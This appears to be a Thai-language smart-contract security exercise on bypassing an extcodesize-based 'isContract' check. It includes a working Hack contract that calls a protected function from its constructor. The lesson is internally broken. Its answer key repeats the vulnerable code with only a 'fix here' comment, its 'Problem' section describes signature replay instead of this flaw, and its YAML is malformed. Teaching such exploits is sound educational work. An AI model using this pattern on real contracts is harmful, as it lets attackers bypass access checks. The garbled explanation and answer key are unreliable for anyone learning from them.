---
title: "Bypass Contract Size Check"
actions: ['checkAnswer', 'hints']
material: 
  editor:
    language: sol
    startingCode: |
    pragma solidity ^0.8.0;

    contract Target {
        function isContract(address account) public view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.
            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }

        bool public pwned = false;

        function protected() external {
            require(!isContract(msg.sender), "no contract allowed");
            pwned = true;
        }
    }

    contract FailedAttack {
        // Attempting to call Target.protected will fail,
        // Target block calls from contract
        function pwn(address _target) external {
            // This will fail
            Target(_target).protected();
        }
    }

    contract Hack {
        bool public isContract;
        address public addr;

        // When contract is being created, code size (extcodesize) is 0.
        // This will bypass the isContract() check
        constructor(address _target) {
            isContract = Target(_target).isContract(address(this));
            addr = address(this);
            // This will work
            Target(_target).protected();
        }
    }
    answer: > 
    pragma solidity ^0.8.0;

    contract Target {
        function isContract(address account) public view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.
            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }

        bool public pwned = false;

        function protected() external {
            //แก้ไขที่นี่
            require(!isContract(msg.sender), "no contract allowed");
            pwned = true;
        }
    }

    contract FailedAttack {
        // Attempting to call Target.protected will fail,
        // Target block calls from contract
        function pwn(address _target) external {
            // This will fail
            Target(_target).protected();
        }
    }

    contract Hack {
        bool public isContract;
        address public addr;

        // When contract is being created, code size (extcodesize) is 0.
        // This will bypass the isContract() check
        constructor(address _target) {
            isContract = Target(_target).isContract(address(this));
            addr = address(this);
            // This will work
            Target(_target).protected();
        }
    }
---

# Bypass Contract Size Check

Bypass Contract Size Check เกิดจาการตรวจสอบว่า msg.sender เป็นสัญญาหรือไม่โดยใช้ extcodesize ซึ่งมีโอกาสล้มเหลว เนื่องจากระหว่างการสร้างสัญญา extcodesize จะส่งกลับค่า 0 การโจมตีนี้ใช้ประโยชน์จากข้อเท็จจริงดังกล่าวเพื่อหลีกเลี่ยงการตรวจสอบและเข้าถึงฟังก์ชันที่ป้องกันไว้

## ตำแหน่งในโค้ด

`extcodesize(account)` เป็นคำสั่งในภาษา Solidity Assembly ที่ใช้เพื่อดึงขนาดของโค้ดที่อยู่ใน address ที่ระบุ โดยจะส่งกลับขนาดของโค้ดที่ติดตั้งในบัญชีนั้น ๆ

1. สำหรับบัญชีที่เป็น Externally Owned Account (EOA) (บัญชีที่ไม่ใช่สัญญา) extcodesize จะส่งกลับค่าเป็น 0
2. สำหรับสัญญา (contract account) extcodesize จะส่งกลับขนาดของโค้ดที่เก็บไว้ในสัญญา
3. ระหว่างการสร้างสัญญา (ภายใน constructor ของสัญญา) extcodesize จะส่งกลับค่า 0 แม้ว่าจะเป็นสัญญาในขณะนี้ เพราะโค้ดของสัญญายังไม่ได้ถูกบันทึกจนกว่าการดำเนินการของ constructor จะเสร็จสิ้น

ตัวอย่างตำแหน่งในโค้ดที่มีช่องโหว่:

``` Solidity
assembly {
    size := extcodesize(account)
}
```

## ปัญหา

หาก signature ถูกใช้ซ้ำ ผู้โจมตีสามารถสร้างธุรกรรมที่เหมือนเดิมซ้ำ ๆ เพื่อโอน Ether ออกไปหลายครั้ง

## แนวทางการป้องกัน

การตรวจสอบโดยใช้ `(tx.origin == msg.sender)` สามารถใช้ป้องกันการเรียกใช้งานจากสัญญาอื่นได้

## ทดสอบ

แก้ไข require ที่ฟังก์ชั่น protected จาก `!isContract(msg.sender)` เป็น `msg.sender == tx.origin`
